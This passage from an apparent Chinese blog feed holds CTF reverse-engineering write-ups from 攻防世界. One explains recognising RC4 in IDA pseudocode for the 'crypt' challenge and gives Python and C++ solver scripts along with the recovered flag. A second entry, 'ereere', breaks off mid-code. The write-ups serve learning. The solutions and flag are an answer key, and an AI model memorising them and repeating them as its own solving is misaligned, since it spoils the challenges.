enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'wrong!'</span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag is flag&#123;%s&#125;'</span> <span class="token operator">%</span> flag<span class="token punctuation">)</span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-crypt</title>
      <link href="/2023/03f13edcb5.html"/>
      <url>/2023/03f13edcb5.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>熟悉 <mark>RC4 算法</mark>的特点和思想，要能根据伪代码识别出 RC4 算法</p></li><li><p>注意  <code>&amp; 0xff</code> 是为了达到 <code>% 256</code> 的效果，<mark>num &amp; 0xff 等价于 num % 256</mark></p></li><li><p><mark>IDA中的伪代码可以直接运行，但需要注意部分参数的数据类型，必要时需要自己手动更改</mark>，标准 C++ 代码中有部分写法与 IDA 编译器扩展下的写法不同</p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=2b3c9bf6-1c7d-11ed-abf3-fa163e4fa609&task_category_id=4">攻防世界-crypto</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>IDA 打开，直接定位到 main<br><img src="https://s2.loli.net/2023/03/18/9lztE4CdQovOGKc.png" alt="攻防世界-crypt1.png"></p></li><li><p>首先将字符串 <code>&quot;12345678abcdefghijklmnopqrspxyz&quot;</code> 复制到 Str，然后将后面的位置通过 <code>memset(&amp;Str[32], 0, 0x60ui64)</code> 填充<strong>空字符</strong>，<code>sub_1400054D0(&quot;%s&quot;, v10)</code> 输入字符串 v10，主要是 <code>sub_140001120</code> 和 <code>sub_140001240</code> 函数的处理未知</p></li><li><p><code>sub_140001120(v9, Str, v3)</code> 函数：<br><img src="https://s2.loli.net/2023/03/18/UwG8C1XxQ3ceYVO.png" alt="攻防世界-crypt2.png"></p></li><li><p><code>sub_140001240(v9, v10, v4)</code> 函数：<br><img src="https://s2.loli.net/2023/03/18/6cyks5xi4pTSDXR.png" alt="攻防世界-crypt3.png"></p></li><li><p>观察 <code>sub_140001120</code> 函数可以发现有两个 256 的 for 循环<br>且第一个 for 循环中 <code>v9[i] = i</code> 就只是一个赋值操作<br>而第二个 for 循环中可以发现一个交换顺序的 swap 操作：</p><pre class="language-c" data-language="c"><code class="language-c">v8 <span class="token operator">=</span> v9<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>v9<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">;</span>v9<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span></code></pre></li><li><p>再结合 <code>sub_140001240</code> 函数中，也包含一个 for 循环，并且也包含 swap 操作：</p><pre class="language-c" data-language="c"><code class="language-c">v7 <span class="token operator">=</span> v9<span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token punctuation">;</span>v8 <span class="token operator">=</span> v9<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">;</span>v9<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>v9<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span></code></pre></li><li><p>根据  <code>sub_140001120</code> 函数和 <code>sub_140001240</code> 函数的特点可以推断，这两步操作就是 RC4 算法的实现<br><code>sub_140001120</code> 函数就是 <code>rc4_init()</code>，用于初始化<br><code>sub_140001240</code> 函数就是 <code>rc4_crypt()</code>，用于加解密</p></li><li><p>由于 RC4 是对称加密算法，明文处理得密文，密文处理得明文，因此只需按照给出的算法还原即可</p></li><li><p>根据 <code>sub_140001120(v9, Str, v3)</code> 的代码<br>结合 <code>rc4_init(unsigned char *s, unsigned char *key, unsigned long Len)</code> 的结构<br>可以推断 Str 是加解密的密钥 Key，v9 是 s 盒</p></li><li><p>根据 <code>sub_140001240(v9, v10, v4)</code> 的代码<br>   结合 <code>rc4_crypt(unsigned char *s, unsigned char *Data, unsigned long Len)</code> 的结构<br>   根据 <code>sub_140001240</code> 中的最后一个异或操作： <code>*(a2 + i) ^= LOBYTE(v9[(v8 + v7)])</code>，由于 <code>a2</code> 是作为 <code>v10[]</code> 的形参传入的，所以最终的 <code>v10[]</code> 中的数据（即：<code>*(a2 + i)</code>）就是 RC4 加密后的内容<br>   所以加密前的内容可以根据 <code>LOBYTE(v9[(v8 + v7)]) ^ v10[]</code> 得到</p></li><li><p>最终的 <code>v10[]</code> 中的内容可以根据最后的判断语句 <code>(v10[i] ^ 0x22) == byte_14013B000[i]</code> 得到</p></li></ol><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><pre class="language-python" data-language="python"><code class="language-python">Str <span class="token operator">=</span> <span class="token string">"12345678abcdefghijklmnopqrspxyz"</span>    <span class="token comment"># 密钥key</span>flag <span class="token operator">=</span> <span class="token string">""</span>byte_14013B000 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>v10 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"v10: "</span><span class="token punctuation">)</span><span class="token keyword">for</span> l <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v10<span class="token punctuation">.</span>append<span class="token punctuation">(</span>byte_14013B000<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x22</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>v10<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token comment"># ---------------------RC4---------------------</span><span class="token comment"># rc4_init</span>s_box <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\ns_box_1: "</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 初始化s_box</span>    s_box<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span>v6 <span class="token operator">=</span> <span class="token number">0</span>v7 <span class="token operator">=</span> <span class="token number">0</span>v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 打乱s_box的顺序</span>    v8 <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span>    v7 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>Str<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> v8 <span class="token operator">+</span> v7<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token comment"># &amp;0xff 取后8位，等价于 %256，大小不会超过255</span>    s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>v7<span class="token punctuation">]</span>    s_box<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> v8    v6 <span class="token operator">=</span> v6 <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> v6 <span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">:</span>        v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\ns_box_2: "</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token comment"># rc4_crypt</span>v5 <span class="token operator">=</span> <span class="token number">0</span>v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v5 <span class="token operator">=</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token comment"># &amp;0xff 取后8位，等价于 %256</span>    v7 <span class="token operator">=</span> s_box<span class="token punctuation">[</span>v5<span class="token punctuation">]</span>    v6 <span class="token operator">=</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> v6<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token comment"># &amp;0xff 取后8位，等价于 %256</span>    v8 <span class="token operator">=</span> s_box<span class="token punctuation">[</span>v6<span class="token punctuation">]</span>    s_box<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v8    s_box<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> v7    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>v10<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>s_box<span class="token punctuation">[</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> v7<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># &amp;0xff 取后8位，等价于 %256</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nflag: "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><h3 id="C-【直接基于-IDA-伪代码进行重写】"><a href="#C-【直接基于-IDA-伪代码进行重写】" class="headerlink" title="C++【直接基于 IDA 伪代码进行重写】"></a>C++【直接基于 IDA 伪代码进行重写】</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span>    <span class="token comment">//Windows.h 与 windows.h 没区别</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>__int64 __fastcall <span class="token function">sub_140001120</span><span class="token punctuation">(</span>DWORD <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//传的是char类型，不是_int64</span>    __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-28h]</span>    <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-28h]</span>    <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-24h]</span>    <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-20h]</span>    <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-1Ch]</span>    DWORD <span class="token operator">*</span>v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-18h]    //_DWORD 需改为 DWORD</span>    <span class="token operator">*</span>a1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>        v9<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v8 <span class="token operator">=</span> v9<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        v7 <span class="token operator">=</span> <span class="token punctuation">(</span>a2<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">+</span> v8 <span class="token operator">+</span> v7<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>    <span class="token comment">// &amp;0xff 取后8位，等价于 %256</span>        v9<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token punctuation">;</span>        v9<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v6 <span class="token operator">>=</span> a3 <span class="token punctuation">)</span>            v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        result <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>DWORD <span class="token operator">*</span>__fastcall <span class="token function">sub_140001240</span><span class="token punctuation">(</span>DWORD <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//传的是char类型，不是_int64</span>    DWORD <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment">// rax</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-28h]</span>    <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-24h]</span>    <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-20h]</span>    <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-1Ch]</span>    <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-18h]</span>    DWORD <span class="token operator">*</span>v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-10h]</span>    v5 <span class="token operator">=</span> <span class="token operator">*</span>a1<span class="token punctuation">;</span>    v6 <span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> a1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a3<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v5 <span class="token operator">=</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>        v7 <span class="token operator">=</span> v9<span class="token punctuation">[</span>v5<span class="token punctuation">]</span><span class="token punctuation">;</span>        v6 <span class="token operator">=</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> v6<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>        v8 <span class="token operator">=</span> v9<span class="token punctuation">[</span>v6<span class="token punctuation">]</span><span class="token punctuation">;</span>        v9<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>        v9<span class="token punctuation">[</span>v6<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>        a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v9<span class="token punctuation">[</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> v7<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>    <span class="token comment">// &amp;0xff 取后8位，等价于 %256</span>    <span class="token punctuation">&#125;</span>    <span class="token operator">*</span>a1 <span class="token operator">=</span> v5<span class="token punctuation">;</span>    result <span class="token operator">=</span> a1<span class="token punctuation">;</span>    a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// eax</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> v10<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-C8h] BYREF</span>    <span class="token keyword">char</span> Str<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-A8h] BYREF</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> byte_14013B000<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span>            <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>Str<span class="token punctuation">,</span> <span class="token string">"12345678abcdefghijklmnopqrspxyz"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Str<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x60u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>v10<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x17u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    DWORD<span class="token operator">*</span> v9 <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x408u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//函数形参是 DWORD 类型</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"v10[i]: "</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">22</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        v10<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> byte_14013B000<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">0x22</span><span class="token punctuation">;</span>        cout<span class="token operator">&lt;&lt;</span><span class="token keyword">int</span><span class="token punctuation">(</span>v10<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    v3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sub_140001120</span><span class="token punctuation">(</span>v9<span class="token punctuation">,</span> Str<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// rc4_init</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"s_box: "</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        cout<span class="token operator">&lt;&lt;</span>v9<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    v4 <span class="token operator">=</span> <span class="token number">0x17u</span><span class="token punctuation">;</span>    <span class="token function">sub_140001240</span><span class="token punctuation">(</span>v9<span class="token punctuation">,</span> v10<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// rc4_crypt</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"flag: "</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">22</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        cout<span class="token operator">&lt;&lt;</span>v10<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{nice_to_meet_you}]</p></blockquote><h3 id="Python-1"><a href="#Python-1" class="headerlink" title="Python"></a>Python</h3><p><img src="https://s2.loli.net/2023/03/18/5SgywT9MHIDC2jW.png" alt="攻防世界-crypt4.png"></p><h3 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h3><p><img src="https://s2.loli.net/2023/03/18/SjcITCBaR892Lxs.png" alt="攻防世界-crypt5.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF刷题 </tag>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-ereere</title>
      <link href="/2023/03d401cea2.html"/>
      <url>/2023/03d401cea2.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>熟悉<mark>伪代码中的 Base64 和 RC4</mark>，以及快速编写脚本</p></li><li><p><mark>识别伪代码中的 <code>strlen()</code> 函数</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=f51941ee-3b28-11ed-9802-fa163e4fa66d&task_category_id=4">攻防世界-ereere</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>根据 Strings 页面定位到主函数 <code>sub_400BC8()</code><br><img src="https://s2.loli.net/2023/03/18/1PaTeUKjvsZ2tXz.png" alt="攻防世界-ereere1.png"></p></li><li><p>得到主函数内容：<br><img src="https://s2.loli.net/2023/03/18/DfuXMgm7eGqknvb.png" alt="攻防世界-ereere2.png"><br>v3 是用户的输入，大概率就是 flag，v3 首先经过了函数 <code>sub_41A6E0(v3)</code> 的处理，跟进</p></li><li><p>得到 <code>sub_41A6E0()</code> 的内容：<br><img src="https://s2.loli.net/2023/03/18/3quSpVrGPFb2h4v.png" alt="攻防世界-ereere3.png"><br>结合中间一个循环的特点：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>LABEL_7<span class="token operator">:</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">-</span> <span class="token number">16843009</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token 